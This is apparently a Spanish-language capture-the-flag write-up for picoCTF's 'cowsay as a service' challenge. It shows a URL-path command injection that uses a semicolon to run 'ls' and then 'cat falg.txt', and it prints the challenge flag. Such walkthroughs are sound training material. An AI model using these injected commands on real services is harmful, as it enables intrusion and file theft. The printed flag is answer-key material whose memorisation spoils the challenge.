## Objetivo
Now presenting [cowsay as a service](https://caas.mars.picoctf.net/)
## Solución
- Al entrar a la pagina te indica que entres al siguiente url:
```bash
https://caas.mars.picoctf.net/cowsay/{message}
```
- Probamos el url con el texto picoCTF y nos muestra la siguiente imagen:
```bash
 _________
< picoCTF >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```
- Ahora tenemos que hacer una inyección de comandos por lo cual colocamos en ese espacio un texto cualquiera y le colocamos un punto y coma el comando ls, por ejemplo:
```bash
https://caas.mars.picoctf.net/cowsay/picoCTF; ls
```
- Al hacer esto obtenemos la imagen de la vaca y además de la lista de archivos que contiene:
```bash
 _________
< picoCTF >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
Dockerfile
falg.txt
index.js
node_modules
package.json
public
yarn.lock

```
- Y ya con esto solo le aplicamos un cat al archivo de la bandera:
```bash
https://caas.mars.picoctf.net/cowsay/picoCTF;%20cat%20falg.txt

 _________
< picoCTF >
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
picoCTF{moooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0o}
```

## Notas Adicionales
## Referencias